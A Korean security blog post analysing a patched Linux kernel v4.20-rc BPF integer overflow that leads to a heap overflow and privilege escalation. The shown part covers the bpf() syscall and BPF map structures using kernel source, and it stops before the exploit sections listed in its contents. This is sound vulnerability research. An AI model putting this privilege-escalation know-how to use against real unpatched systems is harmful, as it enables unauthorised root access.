<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <!-- hexo-inject:begin --><script src='https://unpkg.com/echarts@3.3.2/dist/echarts.min.js'></script><!-- hexo-inject:end --><meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta http-equiv="Cache-Control" content="no-siteapp">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
  <meta name="renderer" content="webkit">
  <meta name="naver-site-verification" content="e19266ac7916f4f7f8ebeef5355bdce5102d3416">

  
  <title>[1-day Analysis] Linux kernel BPF integer overflow &amp; heap overflow | Defenit 블로그</title>

  <link rel="shortcut icon" href="/images/favicon.png">
  <link rel="alternate" href="/rss2.xml" title="Defenit 블로그">
  <meta name="description" content="목차 서론 BPF 모듈 주요 데이터 구조 integer overflow heap overflow 작은 힙 할당 heap overflow trigger victim structure   exploit 취약점 체이닝 debugging   reference    서론ww9210이 2018/11/22에 bpf 모듈에서 integer overflow로 heap ov">
<meta name="keywords" content="Defenit, Hacking, Securify, Exploit, Kernel, Research, Web, Reversing, CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="[1-day Analysis] Linux kernel BPF integer overflow &amp; heap overflow">
<meta property="og:url" content="https://defenit.kr/2019/12/03/Pwn/ㄴ Research/linux-kenel-bpf/index.html">
<meta property="og:site_name" content="Defenit 블로그">
<meta property="og:description" content="목차 서론 BPF 모듈 주요 데이터 구조 integer overflow heap overflow 작은 힙 할당 heap overflow trigger victim structure   exploit 취약점 체이닝 debugging   reference    서론ww9210이 2018/11/22에 bpf 모듈에서 integer overflow로 heap ov">
<meta property="og:locale" content="en">
<meta property="og:updated_time" content="2019-12-06T16:00:46.001Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="[1-day Analysis] Linux kernel BPF integer overflow &amp; heap overflow">
<meta name="twitter:description" content="목차 서론 BPF 모듈 주요 데이터 구조 integer overflow heap overflow 작은 힙 할당 heap overflow trigger victim structure   exploit 취약점 체이닝 debugging   reference    서론ww9210이 2018/11/22에 bpf 모듈에서 integer overflow로 heap ov">

  <meta name="format-detection" content="telephone=no,email=no">
  <meta name="theme-color" content="#9C27B0">
  <meta name="description" content="Team Defenit Blog">
  <meta name="keywords" content>

  <meta name="mobile-web-app-capable" content="yes">
  <meta name="application-name" content="Defenit 블로그">
  <meta name="msapplication-starturl" content="https://defenit.kr/2019/12/03/Pwn/ㄴ Research/linux-kenel-bpf/">
  <meta name="msapplication-navbutton-color" content="#9C27B0">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-title" content="Defenit 블로그">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <link rel="apple-touch-icon" href="/images/favicon.png">

  
    <meta property="article:published_time" content="Tue Dec 03 2019 18:52:29 GMT+0900">
    <meta property="article:modified_time" content="Sat Dec 07 2019 01:00:46 GMT+0900">
  

  
    <link rel="canonical" href="https://defenit.kr/2019/12/03/Pwn/ㄴ Research/linux-kenel-bpf/">
  

  <meta name="google-site-verification" content="Zw9X-H7aB3j4IjiTtdPzc5YXGbBCqAe65ysy9o2dOL8">
  

  
  
  

  <link rel="stylesheet" href="/css/mdui.css">
<link rel="stylesheet" href="/css/style.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>

<body class="mdui-appbar-with-toolbar mdui-drawer-body-left mdui-theme-primary-indigo mdui-theme-accent-pink">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><script>var a=localStorage.getItem("mdui-theme-layout-dark");if(a){document.getElementsByTagName("body")[0].className+=" mdui-theme-layout-dark"};</script>
  <header id="header" class="mdui-appbar mdui-appbar-fixed mdui-appbar-scroll-hide mdui-appbar-inset">
  <div class="mdui-toolbar mdui-color-theme">
    <a href="javascript:;" class="mdui-btn mdui-btn-icon" mdui-drawer="{target: '#sidebar', swipe: true}"><i class="mdui-icon material-icons">menu</i></a>
    <a href="/" class="mdui-typo-headline">Defenit 블로그</a>
    <div class="mdui-toolbar-spacer"></div>
    <a href="javascript:;" class="mdui-btn mdui-btn-icon" mdui-dialog="{target: '#search'}" mdui-tooltip="{content: '검색'}"><i class="mdui-icon material-icons">search</i></a>
    <a href="/rss2.xml" class="mdui-btn mdui-btn-icon" mdui-tooltip="{content: 'RSS'}"><i class="mdui-icon material-icons">rss_feed</i></a>
  </div>
</header>
<div class="mdui-dialog" id="search">
  
    <div class="search-form">
      <input type="search" class="search-form-input" placeholder="입력">
    </div>
    <div class="search-result" data-resource="/search.xml"></div>
  
</div>
  <aside id="sidebar" class="mdui-drawer mdui-drawer-full-height">
  <div class="mdui-grid-tile">
    <img src="/images/banner.png" style="height: 160px;">
    <img src="/images/avatar.png" class="avatar-animation" style="position: absolute; top: 10%; left: 24px; width: 64px; height: 64px; border: 2px solid #fff; border-radius: 50%;">
    <div class="mdui-grid-tile-actions">
      <div class="mdui-grid-tile-text">
        <div class="mdui-grid-tile-title">Defenit</div>
        <div class="mdui-grid-tile-subtitle"><i class="mdui-icon material-icons">art_track</i></div>
      </div>
      
    </div>
  </div>

  <div class="mdui-list" mdui-collapse="{accordion: true}">
    <a href="/" class="mdui-list-item mdui-ripple">
      <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-blue">home</i>
      <div class="mdui-list-item-content">Home</div>
    </a>
    <div class="mdui-collapse-item">
      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
        <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-green">chrome_reader_mode</i>
        <div class="mdui-list-item-content">카테고리</div>
        <i class="mdui-collapse-item-arrow mdui-icon material-icons">keyboard_arrow_down</i>
      </div>
      <div class="mdui-collapse-item-body mdui-list mdui-list-dense"><hr>
	   <h3>
        <a class="mdui-ripple sidebar_archives-link" href="/categories/Crypto/">Crypto<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Crypto/ㄴ-Research/">ㄴ Research<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Forensic/">Forensic<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Forensic/ㄴ-Research/">ㄴ Research<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Pwn/">Pwn<span class="mdui-ripple sidebar_archives-count">8</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Pwn/ㄴ-Research/">ㄴ Research<span class="mdui-ripple sidebar_archives-count">6</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Pwn/ㄴ-WriteUps/">ㄴ WriteUps<span class="mdui-ripple sidebar_archives-count">2</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Rev/">Rev<span class="mdui-ripple sidebar_archives-count">2</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Rev/ㄴ-Research/">ㄴ Research<span class="mdui-ripple sidebar_archives-count">2</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Web/">Web<span class="mdui-ripple sidebar_archives-count">4</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Web/ㄴ-Research/">ㄴ Research<span class="mdui-ripple sidebar_archives-count">3</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Web/ㄴ-WriteUps/">ㄴ WriteUps<span class="mdui-ripple sidebar_archives-count">1</span></a></h3> <hr>
		
        
      </div>
    </div>
    </div>
    <a href="https://www.notion.so/j0n9hyun/4f40ecc7ba7241168f3bd41de0206e24?v=3b0cdd48c6c446098517cc8e8d0bf0fc" class="mdui-list-item mdui-ripple">
      <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-purple">person</i>
      <div class="mdui-list-item-content">팀정보</div>
    </a>
  </div>

  <div class="mdui-divider"></div>

  <div class="mdui-list" mdui-collapse="{accordion: true}">
    
      <a href="https://blog.naver.com/yjw_sz/221631615816" class="mdui-list-item mdui-ripple">Apply</a>
    
    <div class="mdui-collapse-item">
      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
        <div class="mdui-list-item-content">Links</div>
        <i class="mdui-list-item-icon mdui-icon material-icons">link</i>
      </div>
      <div class="mdui-collapse-item-body mdui-list mdui-list-dense">
        
          <a href="https://ctf.j0n9hyun.xyz/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">Wargame</a>
        
          <a href="https://www.facebook.com/Defenit-260502217757766/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">Facebook</a>
        
        
      </div>
    </div>
  </div>
</aside>

  <main id="main" class="mdui-m-t-5 fadeIn animated">
  <link rel="stylesheet" href="https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css">
  <style>#main article .mdui-card-content .center-block{display:block!important;margin-right:auto!important;margin-left:auto!important}</style>
  <article class="mdui-card mdui-m-b-5">
    <header class="mdui-card-media">
      <img src="/images/random/cover.png" style="max-height: 340px;">
      <div class="mdui-card-media-covered">
        <div class="mdui-card-primary">
          <div class="mdui-card-primary-title">[1-day Analysis] Linux kernel BPF integer overflow &amp; heap overflow</div>
          <div class="mdui-card-primary-subtitle"><i class="iconfont">&#xe697;</i> 2019-12-03 / <i class="iconfont">&#xe601;</i> V4bel</div>
        </div>
      </div>
      <div class="mdui-card-menu">
        
          <button class="mdui-btn mdui-btn-icon mdui-text-color-white" mdui-menu="{target: '#qrcode', align: 'right'}"><i class="mdui-icon material-icons">devices</i></button>
          <ul class="mdui-menu" id="qrcode">
            
              <li class="mdui-menu-item"><a class="mdui-text-center mdui-ripple">Send to mobile phone</a></li>
            
            <li class="mdui-menu-item" disabled>
              
                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAAC20lEQVR42u3aS3LiQBAFQO5/6ZkDOBDvVcth0Z1aESBEZy1crs/r35HXCxsbGxsbGxsbG/uR7Fd8vbv/59Oun5+//xZQnhkbGxv7BPaHP/3BsWbHzT9dOTM2Njb2OezrpHLNyBNMcvT80/z52NjY2NjvqLMnJOnnOtzY2NjY2HclsLzpk3zatq6wsbGxsYcNmuBbeSGRjxP+rJeGjY2N/Xh2O+h9wus/mG9jY2NjP5J9b/rJj9imxpWUiY2Njb03O2n9t+/PGEnzKL9z2EvDxsbG/lp28rWV8iBv/STNpjYo2NjY2HuzZ635JFizJn7+tDrE2NjY2Juy84POUtp1sFaS33WYsLGxsc9h31uWzALXjm9nJRA2Njb2rux8KPuh+b5wZ56c2kBgY2Njn8Ye/osfN4/ahc7kF4t0i42NjX0Ae2V9Zz0JXSfCZIzx4QzY2NjYm7LzplIeiHZ4nI94Z+MHbGxs7L3ZefMoL0vaVZs8WCvlEzY2Nvau7DydtMVJO0hYL5CwsbGxz2TPEtistTQbCbdp7BdLEWxsbOxHsttUlAdo1uJv78zx2NjY2Cew22WdtpBoR8htI2mYwLCxsbG/nP0qr9k4NklLK8PgqATCxsbG3pSdJ4n1oxSt/CCgebGEjY2NvTd7tjQ5W4K8a0jcrmZiY2Nj781uE1hSbOS8laIoL5ywsbGxT2C3y44r350VJPmaznAqgo2Njf217PbRyTi2bQm1yzrD82NjY2Nvym6Hr+34drbuk6+B3tZUwsbGxt6CPWsnJQPX2XA3X9/BxsbGPpm9sna5NHYtU2C76ImNjY19Gnt9rJukqLtCMBxOY2NjYx/Abtdr6h9eOHqbYrGxsbGxZ82jfATbHjofJGNjY2Njtw2ddiS8PsrNkys2Njb2aexZCTErVFbWffLVImxsbOxz2OstmxzQLt+0wfrF+TY2Njb2I9nnXNjY2NjY2NjY2NiPuf4DTLORA37sugcAAAAASUVORK5CYII=">
              
            </li>
          </ul>
        
        
          <button class="mdui-btn mdui-btn-icon mdui-text-color-white" mdui-menu="{target: '#share_menu', align: 'right'}"><i class="mdui-icon material-icons">share</i></button>
          <ul class="mdui-menu" id="share_menu">
            <li class="mdui-menu-item">
              <a href="https://www.facebook.com/sharer/sharer.php?u=https://defenit.kr/2019/12/03/Pwn/ㄴ Research/linux-kenel-bpf/" target="_blank" class="mdui-ripple">페이스북 공유</a>
            </li>
          </ul>
        
      </div>
    </header>
    <div class="mdui-card-content mdui-typo">
      <h2 id="목차"><a href="#목차" class="headerlink" title="목차"></a>목차</h2><ul>
<li>서론</li>
<li>BPF 모듈</li>
<li>주요 데이터 구조</li>
<li>integer overflow</li>
<li>heap overflow<ul>
<li>작은 힙 할당</li>
<li>heap overflow trigger</li>
<li>victim structure</li>
</ul>
</li>
<li>exploit<ul>
<li>취약점 체이닝</li>
<li>debugging</li>
</ul>
</li>
<li>reference</li>
</ul>
<hr>

<h2 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h2><p><a href="https://github.com/ww9210/kernel4.20_bpf_LPE" target="_blank" rel="noopener">ww9210</a>이 2018/11/22에 bpf 모듈에서 integer overflow로 heap overflow를 트리거해 lpe를 터트리는 취약점을 리눅스 커뮤니티에 제출했습니다.</p>
<p>처음 해보는 리눅스 커널 1-day 분석이여서 모듈 분석과 익스플로잇 이해, 디버깅에 적지 않은 시간이 소모되었지만 분석을 진행하면서 많은 공부가 되었기에 정리할 겸 1-day 분석글을 작성해보도록 하겠습니다.</p>
<p>해당 취약점은 리눅스 커널 <code>v4.20-rc1</code>, <code>v4.20-rc2</code>, <code>v4.20-rc3</code>, <code>v4.20-rc4</code> 에서 트리거할 수 있으며 1-day 분석은 <code>v4.20-rc1</code> 소스 코드 기준으로 하였습니다.</p>
<hr>

<h2 id="BPF-모듈"><a href="#BPF-모듈" class="headerlink" title="BPF 모듈"></a>BPF 모듈</h2><h5 id="bpf"><a href="#bpf" class="headerlink" title="bpf()"></a>bpf()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span>;</span><br></pre></td></tr></table></figure>
<p><code>BPF(Berkeley Packet Filter)</code>는 사용자 모드에서 네트워크 패킷 필터링에 사용되는 모듈이자 kernel level에서 동작하는 경량화된 가상 머신입니다.</p>
<p>이와 같이 전통적으로 네트워크 패킷 필터링으로 사용되는 모듈을 <code>cBPF(classic BPF)</code>로 정의하고 여기서 더 많은 리소스들을 추가해 더 다양한 용도로 사용되는 모듈을 <code>eBPF(extended BPF)</code>로 정의합니다.</p>
<p>리눅스 커널 v3.18 이후에 추가된 BPF syscall은 모두 eBPF이며 cBPF는 일부에서만 사용됩니다.</p>
<h5 id="bpf-syscall"><a href="#bpf-syscall" class="headerlink" title="bpf syscall"></a>bpf syscall</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(bpf, <span class="keyword">int</span>, cmd, <span class="keyword">union</span> bpf_attr __user *, uattr, <span class="keyword">unsigned</span> <span class="keyword">int</span>, size)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">union</span> bpf_attr attr = &#123;&#125;;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sysctl_unprivileged_bpf_disabled &amp;&amp; !capable(CAP_SYS_ADMIN))</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">	err = bpf_check_uarg_tail_zero(uattr, <span class="keyword">sizeof</span>(attr), size);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	size = <span class="keyword">min_t</span>(u32, size, <span class="keyword">sizeof</span>(attr));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* copy attributes from user space, may be less than sizeof(bpf_attr) */</span></span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(&amp;attr, uattr, size) != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">	err = security_bpf(cmd, &amp;attr, size);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	<span class="keyword">case</span> BPF_MAP_CREATE:</span><br><span class="line">		err = map_create(&amp;attr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_MAP_LOOKUP_ELEM:</span><br><span class="line">		err = map_lookup_elem(&amp;attr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_MAP_UPDATE_ELEM:</span><br><span class="line">		err = map_update_elem(&amp;attr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_MAP_DELETE_ELEM:</span><br><span class="line">		err = map_delete_elem(&amp;attr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_MAP_GET_NEXT_KEY:</span><br><span class="line">		err = map_get_next_key(&amp;attr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_PROG_LOAD:</span><br><span class="line">		err = bpf_prog_load(&amp;attr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_OBJ_PIN:</span><br><span class="line">		err = bpf_obj_pin(&amp;attr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_OBJ_GET:</span><br><span class="line">		err = bpf_obj_get(&amp;attr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_PROG_ATTACH:</span><br><span class="line">		err = bpf_prog_attach(&amp;attr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_PROG_DETACH:</span><br><span class="line">		err = bpf_prog_detach(&amp;attr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_PROG_QUERY:</span><br><span class="line">		err = bpf_prog_query(&amp;attr, uattr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_PROG_TEST_RUN:</span><br><span class="line">		err = bpf_prog_test_run(&amp;attr, uattr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_PROG_GET_NEXT_ID:</span><br><span class="line">		err = bpf_obj_get_next_id(&amp;attr, uattr,</span><br><span class="line">					  &amp;prog_idr, &amp;prog_idr_lock);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_MAP_GET_NEXT_ID:</span><br><span class="line">		err = bpf_obj_get_next_id(&amp;attr, uattr,</span><br><span class="line">					  &amp;map_idr, &amp;map_idr_lock);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_PROG_GET_FD_BY_ID:</span><br><span class="line">		err = bpf_prog_get_fd_by_id(&amp;attr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_MAP_GET_FD_BY_ID:</span><br><span class="line">		err = bpf_map_get_fd_by_id(&amp;attr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_OBJ_GET_INFO_BY_FD:</span><br><span class="line">		err = bpf_obj_get_info_by_fd(&amp;attr, uattr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_RAW_TRACEPOINT_OPEN:</span><br><span class="line">		err = bpf_raw_tracepoint_open(&amp;attr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_BTF_LOAD:</span><br><span class="line">		err = bpf_btf_load(&amp;attr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_BTF_GET_FD_BY_ID:</span><br><span class="line">		err = bpf_btf_get_fd_by_id(&amp;attr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_TASK_FD_QUERY:</span><br><span class="line">		err = bpf_task_fd_query(&amp;attr, uattr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_MAP_LOOKUP_AND_DELETE_ELEM:</span><br><span class="line">		err = map_lookup_and_delete_elem(&amp;attr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		err = -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>일반적으로 BPF 모듈은 유저 모드에서 위와 같이 <code>bpf()</code> syscall로 호출할 수 있습니다.</p>
<p>모듈의 여러 기능 중 익스에 이용할 기능은 <code>BPF_MAP_CREATE</code>와 <code>BPF_MAP_UPDATE_ELEM</code> 입니다.</p>
<p><code>BPF_MAP_CREATE</code> 기능은 <code>eBPF map</code>을 생성하고 해당 맵을 가르키는 <code>file descriptor</code>를 반환합니다. 여기서 <code>eBPF map</code>은 커널 공간과 유저 공간 사이에서의 데이터 공유등의 용도로 사용되는 자료 구조입니다.</p>
<p><code>BPF_MAP_UPDATE_ELEM</code> 기능은 인자로 넘긴 <code>fd</code>에 해당하는 맵에서 특정 항목을 생성, 수정할 수 있습니다.</p>
<hr>

<h2 id="주요-데이터-구조"><a href="#주요-데이터-구조" class="headerlink" title="주요 데이터 구조"></a>주요 데이터 구조</h2><p>해당 취약점을 트리거하기 위해 사용되는 BPF 모듈의 주요 데이터 구조는 다음과 같습니다.</p>
<h5 id="struct-bpf-queue-stack"><a href="#struct-bpf-queue-stack" class="headerlink" title="struct bpf_queue_stack"></a>struct bpf_queue_stack</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> <span class="title">map</span>;</span></span><br><span class="line">    <span class="keyword">raw_spinlock_t</span> lock;</span><br><span class="line">    u32 head, tail;</span><br><span class="line">    u32 size; <span class="comment">/* max_entries + 1 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> elements[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>bpf_queue_stack</code> 구조체는 커널 힙에 할당되는 <code>eBPF map</code> 자료 구조의 헤더 부분으로 데이터 구조에 대한 관리를 담당합니다.</p>
<h5 id="struct-bpf-map"><a href="#struct-bpf-map" class="headerlink" title="struct bpf_map"></a>struct bpf_map</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> &#123;</span></span><br><span class="line">    <span class="comment">/* The first two cachelines with read-mostly members of which some</span></span><br><span class="line"><span class="comment">     * are also accessed in fast-path (e.g. ops, max_entries).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span> ____<span class="title">cacheline_aligned</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">inner_map_meta</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span> *security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">enum</span> bpf_map_type map_type;</span><br><span class="line">    u32 key_size;</span><br><span class="line">    u32 value_size;</span><br><span class="line">    u32 max_entries;</span><br><span class="line">    u32 map_flags;</span><br><span class="line">    u32 pages;</span><br><span class="line">    u32 id;</span><br><span class="line">    <span class="keyword">int</span> numa_node;</span><br><span class="line">    u32 btf_key_type_id;</span><br><span class="line">    u32 btf_value_type_id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line">    <span class="keyword">bool</span> unpriv_array;</span><br><span class="line">    <span class="comment">/* 55 bytes hole */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The 3rd and 4th cacheline with misc members to avoid false sharing</span></span><br><span class="line"><span class="comment">     * particularly with refcounting.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> ____<span class="title">cacheline_aligned</span>;</span></span><br><span class="line">    <span class="keyword">atomic_t</span> refcnt;</span><br><span class="line">    <span class="keyword">atomic_t</span> usercnt;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>bpf_map</code> 구조체는 <code>bpf_queue_stack</code> 구조체의 첫 번째 멤버로써, 생성된 맵에 대한 구체적인 정보가 담겨있습니다.</p>
<p>추후 맵 초기화 과정에서 <code>bpf_map_init_from_attr()</code> 함수에 의해 <code>*attr</code> 인자의 정보가 해당 구조체로 복사됩니다.</p>
<h5 id="struct-bpf-map-ops"><a href="#struct-bpf-map-ops" class="headerlink" title="struct bpf_map_ops"></a>struct bpf_map_ops</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 